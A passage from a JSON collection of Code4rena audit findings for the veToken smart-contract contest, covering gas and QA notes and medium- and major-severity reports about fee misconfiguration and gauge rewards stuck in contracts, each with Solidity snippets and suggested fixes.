of `safeApprove()`\n\n## Reference\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219\n\n\n\n# Hardcoded BLOCKS_PER_YEAR \n\n## Proof-of-Concept\n\nThe number of block per day is hardcoded in the `BaseRewardPool` contract, and it is used for the calculation of APY. However, number of block per day is not fixed at the same rate every year. For instance, the block per day is around 5000 in 2016, while the block per day is around 6000 in 2022. Thus, the rate might change in the future.\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L59](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L59)\n\n```solidity\nuint256 constant BLOCKS_PER_DAY = 6450;\nuint256 constant BLOCKS_PER_YEAR = BLOCKS_PER_DAY * 365;\nuint256 constant EXTRA_REWARD_POOLS = 3;\n\nfunction getAPY() external view returns (uint256) {\n    return rewardRate.mul(BLOCKS_PER_YEAR).mul(1e18).div(totalSupply());\n}\n```\n\n## Recommended Mitigation Steps\n\nConsider having a setter method for BLOCKS_PER_DAY and make it non-constant.\n\n\n\n# Did not safeApprove(0) First\n\n## Impact\n\nSome tokens (e.g. USDT) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and followed by the actual allowance to be approved.\n\n## Proof-of-Concept\n\n- [https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L374](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L374)\n- [https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L162](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeAssetDepositor.sol#L162)\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount. ",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/223"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Gas\n\nThe `operator` state variable in `DepositToken` is set in the constructor and cannot change. It can be declared immutable:\n\n[`DepositToken`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/DepositToken.sol#L15-L25)\n\n```solidity\n    address public operator;\n\n    constructor(address _operator, address _lptoken)\n        ERC20(\n            string(abi.encodePacked(ERC20(_lptoken).name(), \" Vetoken Deposit\")),\n            string(abi.encodePacked(\"VE3\", ERC20(_lptoken).symbol()))\n        )\n    {\n        operator = _operator;\n    }\n\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/219"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### Missing approval reset\n\n`Booster#deposit` calls `safeApprove` without first ensuring that the approval balance is zero. However, `safeApprove` will revert if the approval amount is not zero. If the reward contract has an existing approval amount, this may cause deposits to revert.\n\n[`Booster#deposit`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L370-L379)\n\n```solidity\n        if (_stake) {\n            //mint here and send to rewards on user behalf\n            ITokenMinter(token).mint(address(this), _amount);\n            address rewardContract = pool.veAssetRewards;\n            IERC20(token).safeApprove(rewardContract, _amount);\n            IRewards(rewardContract).stakeFor(msg.sender, _amount);\n        } else {\n            //add user balance directly\n            ITokenMinter(token).mint(msg.sender, _amount);\n        }\n```\n\nRecommendation: set approval to zero before setting the new amount:\n\n```solidity\n        if (_stake) {\n            //mint here and send to rewards on user behalf\n            ITokenMinter(token).mint(address(this), _amount);\n            address rewardContract = pool.veAssetRewards;\n            IERC20(token).safeApprove(rewardContract, 0);\n            IERC20(token).safeApprove(rewardContract, _amount);\n            IRewards(rewardContract).stakeFor(msg.sender, _amount);\n        } else {\n            //add user balance directly\n            ITokenMinter(token).mint(msg.sender, _amount);\n        }\n```\n\n## Noncritical\n\n### Prefer two step authorization changes\n\nSeveral contracts set a privileged owner/operator address in a single step. If this operator address is set to zero or an incorrect value, ownership of these contracts may be permanently lost. \n\nSuggestion: handle ownership changes with two steps and two transactions. First, allow the current owner/operator to propose a new owner address. Second, allow the proposed address (and only the proposed address) to accept ownership, and update the contract owner internally.\n\n- [`VeToken#setOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/token/VeToken.sol#L18)\n- [`Ve3Token#setOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/token/VE3Token.sol#L21)\n- [`VoterProxy#setOwner`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L62)\n- [`VoterProxy#setoperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L67)\n- [`VoterProxy#setDepositor`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L77)\n\n### Emit events from permissioned functions\n\nConsider adding events to protected functions that change contract state, especially when updating privileged user addresses. This enables you to monitor these events off chain for suspicious activity, and in the case of protocol parameter changes, allows end users to observe and trust changes made to these parameters.\n\n- [`VoterProxy#setOwner`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L62)\n- [`VoterProxy#setoperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L67)\n- [`VoterProxy#setDepositor`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L77)\n- [`VeTokenMinter#addOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeTokenMinter.sol#L32)\n- [`VeTokenMinter#removeOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeTokenMinter.sol#L36)\n- [`VeTokenMinter#updateveAssetWeight`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VeTokenMinter.sol#L41)\n- [`VE3DRewardPool#addOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L114)\n- [`VE3DRewardPool#removeOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L118)\n- [`VE3DRewardPool#addOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VE3DRewardPool.sol#L114)\n- [`TokenFactory#addOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/TokenFactory.sol#L19)\n- [`TokenFactory#removeOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/TokenFactory.sol#L23)\n- [`StashFactory#removeOperator](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/StashFactory.sol#L34)\n- [`StashFactory#addOperator](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/StashFactory.sol#L30)\n- [`RewardFactory#removeActiveReward`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/RewardFactory.sol#L56)\n- [`RewardFactory#addActiveReward`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/RewardFactory.sol#L39)\n- [`RewardFactory#removeOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/RewardFactory.sol#L29)\n- [`RewardFactory#removeOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/RewardFactory.sol#L29)\n- [`RewardFactory#addOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/RewardFactory.sol#L24)\n- [`VeToken#setOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/token/VeToken.sol#L18)\n- [`Ve3Token#setOperator`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/token/VE3Token.sol#L21)\n\n## QA\n\n### Calculate APY off chain\n\n`BaseRewardPool` uses a rough estimate of `BLOCKS_PER_YEAR` to calculate APY. However, blocktimes are currently variable and using this fixed value may over- or under-estimate the APY. Consider calculating this value offchain using `rewardRate` and `totalSupply` rather than using a hardcoded blocks per day estimate.\n\n[`BaseRewardPool#getAPY`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/BaseRewardPool.sol#L343-L346)\n\n```solidity\n    function getAPY() external view returns (uint256) {\n        return rewardRate.mul(BLOCKS_PER_YEAR).mul(1e18).div(totalSupply());\n    }\n}\n```\n\n### Omit `SafeMath` library\n\nSolidity versions >= 0.8.x perform [checked arithmetic by default](https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html), so the `SafeMath` library is unnecessary in most cases. (However, it may be convenient to include it in some cases to maintain compatibility with forked contracts, like Synthetix `BaseRewardPool`).\n\nUsages of `SafeMath`:\n\n```solidity\ncontracts/VeAssetDepositor.sol\n16:    using SafeMath for uint256;\n\ncontracts/DepositToken.sol\n13:    using SafeMath for uint256;\n\ncontracts/BaseRewardPool.sol\n52:    using SafeMath for uint256;\n\ncontracts/VirtualBalanceRewardPool.sol\n51:    using SafeMath for uint256;\n66:    using SafeMath for uint256;\n\ncontracts/VE3DRewardPool.sol\n55:    using SafeMath for uint256;\n\ncontracts/ExtraRewardStashV2.sol\n18:    using SafeMath for uint256;\n\ncontracts/ExtraRewardStashV1.sol\n18:    using SafeMath for uint256;\n\ncontracts/VeTokenMinter.sol\n12:    using SafeMath for uint256;\n\ncontracts/ExtraRewardStashV3.sol\n18:    using SafeMath for uint256;\n\ncontracts/VoterProxy.sol\n19:    using SafeMath for uint256;\n\ncontracts/PoolManager.sol\n17:    using SafeMath for uint256;\n\ncontracts/Booster.sol\n21:    using SafeMath for uint256;\n\ncontracts/token/VeToken.sol\n8:    using SafeMath for uint256;\n\ncontracts/token/VE3Token.sol\n13:    using SafeMath for uint256;\n```\n\n### Omit unused libraries\n\nThere are several places throughout the codebase where the `SafeERC20`, `Address`, and `SafeMath` libraries are imported and attached, but unused.\n\nFor example, see [`Ve3Token.sol`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/token/VE3Token.sol#L1-L37):\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.7;\n\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract VE3Token is ERC20 {\n    using SafeERC20 for IERC20;\n    using Address for address;\n    using SafeMath for uint256;\n\n    address public operator;\n\n    constructor(string memory name, string memory symbol) ERC20(name, symbol) {\n        operator = msg.sender;\n    }\n\n    function setOperator(address _operator) external {\n        require(msg.sender == operator, \"!auth\");\n        operator = _operator;\n    }\n\n    function mint(address _to, uint256 _amount) external {\n        require(msg.sender == operator, \"!authorized\");\n\n        _mint(_to, _amount);\n    }\n\n    function burn(address _from, uint256 _amount) external {\n        require(msg.sender == operator, \"!authorized\");\n\n        _burn(_from, _amount);\n    }\n}\n```\n\nSince none of this contract's functions make use of `SafeERC20`, `Address`, or `SafeMath` library functions, they may all be safely omitted.\n\n### Log previous values in events\n\nConsider logging the previous value in events that log parameter state changes. This makes it easier to identify the impact of these changes when monitoring off-chain. \n\n[`Booster#setOwner`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L123-L127)\n\n```solidity\n    function setOwner(address _owner) external {\n        require(msg.sender == owner, \"!auth\");\n        owner = _owner;\n        emit OwnerUpdated(_owner);\n    }\n```\n\n### Unused imports\n\n- [`EnumerableSet.sol`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/PoolManager.sol#L8) in `PoolManager`\n\n### Incorrect comment\n\nA comment in [`Booster#setFees`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L233) suggests that fee values must be limited to certain ranges, but the range validation from the upstream Convex booster [contract](https://github.com/convex-eth/platform/blob/1f11027d429e454dacc4c959502687eaeffdb74a/contracts/contracts/Booster.sol#L152) has been removed in the veToken booster.\n\n### Typos\n\n- `platform` in [`Booster`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L31)\n- `Exceed` in [`VeToken#mint`](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/token/VeToken.sol#L25)\n",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/218"
    }
  },
  {
    "title": "Misconfiguration of Fees Incentive Might Cause Tokens To Be Stuck In `Booster` Contract",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L193\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L576\n\n\n# Vulnerability details\n\n## Proof-of-Concept\n\nThe `Booster.setFeeInfo` function is responsible for setting the allocation of gauge fees between lockers and $VE3D stakers.  `lockFeesIncentive` and `stakerLockFeesIncentive` should add up to `10000` , which is equivalent to `100%`.\n\nHowever, there is no validation check to ensure that that `_lockFeesIncentive` and `_stakerLockFeesIncentive` add up to `10000`. Thus, it entirely depends on the developer to get these two values right.\n\nAs such, it is possible to set `lockFeesIncentive + takerLockFeesIncentive` to be less than `100%`. This might happen due to human error. For instance, a typo (forget a few zero) or newly joined developer might not be aware of the fee denomination and called `setFeeInfo(40, 60)` instead of `setFeeInfo(4000, 6000)`.\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L193](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L193)\n\n```solidity\nuint256 public constant FEE_DENOMINATOR = 10000;\n\n// Set reward token and claim contract, get from Curve's registry\nfunction setFeeInfo(uint256 _lockFeesIncentive, uint256 _stakerLockFeesIncentive) external {\n    require(msg.sender == feeManager, \"!auth\");\n\n    lockFeesIncentive = _lockFeesIncentive;\n    stakerLockFeesIncentive = _stakerLockFeesIncentive;\n    ..SNIP..\n}\n```\n\nAssume that `setFeeInfo(40, 60)` is called instead of of `setFeeInfo(4000, 6000)`, only `1%` of the fee collected will be transferred to the users and the remaining `99%` of the fee collected will be stuck in the `Booster` contract.\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L576](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L576)\n\n```solidity\nfunction earmarkFees() external returns (bool) {\n    //claim fee rewards\n    IStaker(staker).claimFees(feeDistro, feeToken);\n    //send fee rewards to reward contract\n    uint256 _balance = IERC20(feeToken).balanceOf(address(this));\n\n    uint256 _lockFeesIncentive = _balance.mul(lockFeesIncentive).div(FEE_DENOMINATOR);\n    uint256 _stakerLockFeesIncentive = _balance.mul(stakerLockFeesIncentive).div(\n        FEE_DENOMINATOR\n    );\n    if (_lockFeesIncentive > 0) {\n        IERC20(feeToken).safeTransfer(lockFees, _lockFeesIncentive);\n        IRewards(lockFees).queueNewRewards(_lockFeesIncentive);\n    }\n    if (_stakerLockFeesIncentive > 0) {\n        IERC20(feeToken).safeTransfer(stakerLockRewards, _stakerLockFeesIncentive);\n        IRewards(stakerLockRewards).queueNewRewards(feeToken, _stakerLockFeesIncentive);\n    }\n    return true;\n}\n```\n\n### Can we retrieve or \"save\" the tokens stuck in `Booster` contract?\n\nAny veAsset (e.g. CRV, ANGLE) sitting on the `Booster` contract is claimable. However, in this case, the `feeToken` is likely not a veAsset, thus the remaining gauge fee will be stuck in the `Booster` contract perpetually. For instance, in Curve, the gauge fee is paid out in 3CRV, the LP token for the TriPool. ([Source](https://resources.curve.fi/crv-token/understanding-crv#staking-trading-fees))\n\n## Impact\n\nUsers will lost their gauge fee if this happens.\n\n## Recommended Mitigation Steps\n\nImplement validation check to ensure that `lockFeesIncentive` and `takerLockFeesIncentive` add up to 100% to eliminate any risk of misconfiguration.\n\n```solidity\nuint256 public constant FEE_DENOMINATOR = 10000;\n\n// Set reward token and claim contract, get from Curve's registry\nfunction setFeeInfo(uint256 _lockFeesIncentive, uint256 _stakerLockFeesIncentive) external {\n    require(msg.sender == feeManager, \"!auth\");\n    require(_lockFeesIncentive + _stakerLockFeesIncentive == FEE_DENOMINATOR, \"Invalid fees\");\n\n    lockFeesIncentive = _lockFeesIncentive;\n    stakerLockFeesIncentive = _stakerLockFeesIncentive;\n    ..SNIP..\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/215"
    }
  },
  {
    "title": "Gauge Rewards Stuck In `VoterProxy` Contract When `ExtraRewardStashV3` Is Used Within Angle Deployment",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L495\n\n\n# Vulnerability details\n\n> Note: This report aims to discuss the issue encountered when `ExtraRewardStashV3` is used within Angle Deployment. There is also another issue when `ExtraRewardStashV2` is used within Angle Deployment, but I will raise it in a separate report since `ExtraRewardStashV2` and `ExtraRewardStashV3` operate differently, and the proof-of-concept and mitigation are different too.\n\n## Proof-of-Concept\n\nIn this example, assume the following Angle's gauge setup\n\n> Name = Angle sanDAI_EUR Gauge\n>\n> Symbol = SsanDAI_EUR\n>\n> reward_count = 2\n>\n> reward_tokens(0) = ANGLE\n>\n> reward_tokens(1) = DAI\n>\n> Gauge Contract: [LiquidityGaugeV4.vy](https://github.com/AngleProtocol/angle-core/blob/4d854e0d74be703a3707898f26ea2dd4166bc9b6/contracts/staking/LiquidityGaugeV4.vy)\n>\n> Stash Contract: [ExtraRewardStashV3](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/ExtraRewardStashV3.sol)\n\nTo collect the gauge rewards, users would trigger the `Booster._earmarkRewards` function to claim veAsset and extra rewards from a gauge. \n\nPer the code logic, the function will attempt to execute the following two key operations:\n\n1) First Operation -  Claim the veAsset by calling `VoterProxy.claimVeAsset`. Call Flow as follow: `VoterProxy.claimVeAsset() > IGauge(_gauge).claim_rewards()`.\n2) Second Operation - Claim extra rewards by calling `ExtraRewardStashV3.claimRewards`. Call flow as follows: `ExtraRewardStashV3.claimRewards > Booster.claimRewards > VoterProxy.claimRewards > IGauge(_gauge).claim_rewards()` . \n\nNote that`IGauge(_gauge).claim_rewards()` will claim all available reward tokens from the Angle's gauge.\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L495](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/Booster.sol#L495)\n\n```solidity\n//claim veAsset and extra rewards and disperse to reward contracts\nfunction _earmarkRewards(uint256 _pid) internal {\n    PoolInfo storage pool = poolInfo[_pid];\n    require(pool.shutdown == false, \"pool is closed\");\n\n    address gauge = pool.gauge;\n\n    //claim veAsset\n    IStaker(staker).claimVeAsset(gauge);\n\n    //check if there are extra rewards\n    address stash = pool.stash;\n    if (stash != address(0)) {\n        //claim extra rewards\n        IStash(stash).claimRewards();\n        //process extra rewards\n        IStash(stash).processStash();\n    }\n\t..SNIP..\n}\n```\n\n### First Operation -  Claim the veAsset\n\nSince this is a Angle Deployment, when the `VoterProxy.claimVeAsset` is triggered,  it will go through the if-else logic (`escrowModle == IVoteEscrow.EscrowModle.ANGLE`) and execute ` IGauge(_gauge).claim_rewards()`, and all rewards tokens will be sent to `VoterProxy` contract. Assume that `100 ANGLE` and `100 DAI` were received.\n\nNote that in this example, we have two reward tokens (ANGLE and DAI). Additionally, gauge redirection was not configured on the gauge at this point, thus the gauge rewards will be sent to the caller, which is the `VoterProxy` contract.\n\nSubsequently, the code `IERC20(veAsset).safeTransfer(operator, _balance);` will be executed, and veAsset (`100 ANGLE`) reward tokens will be transferred to the `Booster` contract for distribution. However, the `100 DAI` reward tokens will remain stuck in the `VoterProxy` contract. As such, users will not be able to get any reward tokens (e.g. DAI, WETH) except veAsset (ANGLE) tokens from the gauges.\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L224](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/VoterProxy.sol#L224)\n\n```solidity\nfunction claimVeAsset(address _gauge) external returns (uint256) {\n    require(msg.sender == operator, \"!auth\");\n\n    uint256 _balance = 0;\n\n    if (escrowModle == IVoteEscrow.EscrowModle.PICKLE) {\n        try IGauge(_gauge).getReward() {} catch {\n            return _balance;\n        }\n    } else if (\n        escrowModle == IVoteEscrow.EscrowModle.CURVE ||\n        escrowModle == IVoteEscrow.EscrowModle.RIBBON\n    ) {\n        try ITokenMinter(minter).mint(_gauge) {} catch {\n            return _balance;\n        }\n    } else if (escrowModle == IVoteEscrow.EscrowModle.IDLE) {\n        try ITokenMinter(minter).distribute(_gauge) {} catch {\n            return _balance;\n        }\n    } else if (escrowModle == IVoteEscrow.EscrowModle.ANGLE) {\n        try IGauge(_gauge).claim_rewards() {} catch {\n            return _balance;\n        }\n    }\n\n    _balance = IERC20(veAsset).balanceOf(address(this));\n    IERC20(veAsset).safeTransfer(operator, _balance);\n\n    return _balance;\n}\n```\n\nFollowing is Angle's Gauge Contract for reference:\n\n[https://github.com/AngleProtocol/angle-core/blob/4d854e0d74be703a3707898f26ea2dd4166bc9b6/contracts/staking/LiquidityGaugeV4.vy#L344](https://github.com/AngleProtocol/angle-core/blob/4d854e0d74be703a3707898f26ea2dd4166bc9b6/contracts/staking/LiquidityGaugeV4.vy#L344)\n\n(Mainnet Deployed Address: https://etherscan.io/address/0x8E2c0CbDa6bA7B65dbcA333798A3949B07638026) \n\n> Note: Angle Protocol is observed to use LiquidityGaugeV4 contract for all of their gauges. Thus, ExtraRewardStashV3 is utilised during pool creation.\n\n```python\n@external\n@nonreentrant('lock')\ndef claim_rewards(_addr: address = msg.sender, _receiver: address = ZERO_ADDRESS):\n    \"\"\"\n    @notice Claim available reward tokens for `_addr`\n    @param _addr Address to claim for\n    @param _receiver Address to transfer rewards to - if set to\n                     ZERO_ADDRESS, uses the default reward receiver\n                     for the caller\n    \"\"\"\n    if _receiver != ZERO_ADDRESS:\n        assert _addr == msg.sender  # dev: cannot redirect when claiming for another user\n    self._checkpoint_rewards(_addr, self.totalSupply, True, _receiver)\n```\n\n### Second Operation - Claim extra rewards\n\nAfter the `IStaker(staker).claimVeAsset(gauge);` code within the `Booster._earmarkRewards` function is executed, `IStash(stash).claimRewards();`  and `IStash(stash).processStash();` functions will be executed next. `stash` == `ExtraRewardStashV3`.\n\nThe `ExtraRewardStashV3.claimRewards` will call the `Booster.setGaugeRedirect` first so that all the gauge rewards will be redirected to `ExtraRewardStashV3` stash contract. Subsequently, `ExtraRewardStashV3.claimRewards` will trigger `Booster.claimRewards` to claim the gauge rewards from the Angle's gauge. \n\nNote that this is the second time the contract attempts to claim gauge rewards from the gauge. Thus, no gauge rewards will be received since we already claimed them earlier. Next, `ExtraRewardStashV3` will attempt to process all the tokens stored in its contract and send them to the respective reward contracts for distribution to the users. However, the contract does not have any tokens stored in it because the earlier attempt to claim gauge rewards return nothing.\n\nAs we can see, the DAI reward tokens are still stuck in the `VoterProxy` contract at this point.\n\n[https://github.com/AngleProtocol/angle-core/blob/4d854e0d74be703a3707898f26ea2dd4166bc9b6/contracts/staking/LiquidityGaugeV4.vy#L332](https://github.com/AngleProtocol/angle-core/blob/4d854e0d74be703a3707898f26ea2dd4166bc9b6/contracts/staking/LiquidityGaugeV4.vy#L332)\n\n```python\ndef set_rewards_receiver(_receiver: address):\n    \"\"\"\n    @notice Set the default reward receiver for the caller.\n    @dev When set to ZERO_ADDRESS, rewards are sent to the caller\n    @param _receiver Receiver address for any rewards claimed via `claim_rewards`\n    \"\"\"\n    self.rewards_receiver[msg.sender] = _receiver\n```\n\n[https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/ExtraRewardStashV3.sol#L61](https://github.com/code-423n4/2022-05-vetoken/blob/2d7cd1f6780a9bcc8387dea8fecfbd758462c152/contracts/ExtraRewardStashV3.sol#L61)\n\n```solidity\n//try claiming if there are reward tokens registered\nfunction claimRewards() external returns (bool) {\n    require(msg.sender == operator, \"!authorized\");\n\n    //this is updateable from v2 gauges now so must check each time.\n    checkForNewRewardTokens();\n\n    //make sure we're redirected\n    if (!hasRedirected) {\n        IDeposit(operator).setGaugeRedirect(pid);\n        hasRedirected = true;\n    }\n\n    uint256 length = tokenCount;\n    if (length > 0) {\n        //claim rewards on gauge for staker\n        //using reward_receiver so all rewards will be moved to this stash\n        IDeposit(operator).claimRewards(pid, gauge);\n    }\n    return true;\n}\n```\n\n## Impact\n\nUser's gauge rewards are frozen/stuck in `VoterProxy` contract. Additionally, there is no method to sweep/collect the reward tokens stuck in the `VoterProxy` contract.\n\n## Recommended Mitigation Steps\n\n> Note: I do not see `Booster.setGaugeRedirect` being called in the deployment and testing scripts. Thus, it is fair to assume that the team is not aware of the need to trigger `Booster.setGaugeRedirect` during deployment. If the gauge redirection has been set to the stash contract `ExtraRewardStashV3` right from the start before anyone triggered the `earmarkRewards` function, this issue should not occur.\n\nConsider triggering `Booster.setGaugeRedirect` during the deployment to set gauge redirection to stash contract (`ExtraRewardStashV3`) so that the Angle's gauge rewards will not be redirected to `VoterProxy` contract and get stuck there.\n\nAlternatively, update the `Booster._earmarkRewards` to as follows:\n\n```solidity\n//claim veAsset and extra rewards and disperse to reward contracts\nfunction _earmarkRewards(uint256 _pid) internal {\n\tPoolInfo storage pool = poolInfo[_pid];\n\trequire(pool.shutdown == false, \"pool is closed\");\n\n\taddress stash = pool.stash;\n\tif (escrowModle == IVoteEscrow.EscrowModle.ANGLE) {\n\t\t//claims gauges rewards\n\t\tIStash(stash).claimRewards();\n\t\t//process gauges rewards\n\t\tIStash(stash).processStash();\n\t} else {\n\t\t//claim veAsset\n        IStaker(staker).claimVeAsset(gauge);\n\n        //check if there are extra rewards\n        address stash = pool.stash;\n        if (stash != address(0)) {\n            //claim extra rewards\n            IStash(stash).claimRewards();\n            //process extra rewards\n            IStash(stash).processStash();\n        }\n\t}\n\n\t//veAsset balance\n    uint256 veAssetBal = IERC20(veAsset).balanceOf(address(this));\n\t..SNIP..\n}\n```\n\nThere is no need to specifically call `VoterProxy.claimVeAsset` to fetch ANGLE for Angle Protocol because calling `IStash(stash).claimRewards()` will fetch both ANGLE and other reward tokens from the gauge anyway. When the stash contract receives the ANGLE tokens, it will automatically transfer all of them back to `Booster` contract when `IStash(stash).processStash()` is executed. The `IStash(stash).claimRewards()` function also performs a sanity check to ensure that the gauge redirection is pointing to itself before claiming the gauge rewards, and automatically configure them if it is not, so it will not cause the reward tokens to get stuck in `VoterProxy` contract.\n\n- Curve uses an older version of LiquidityGauge contract. Thus, two calls are needed (`Minter.mint` to claim CRV and `LiquidityGauge.claim_rewards` to claim other rewards). \n\n- Angle uses newer version of LiquidityGauge (V4) contract that just need one function call (`LiquidityGauge.claim_rewards` ) to fetch both veAsset and other rewards.\n- IDLE uses LiquidityGauge (V3) contract. veAsset (IDLE) 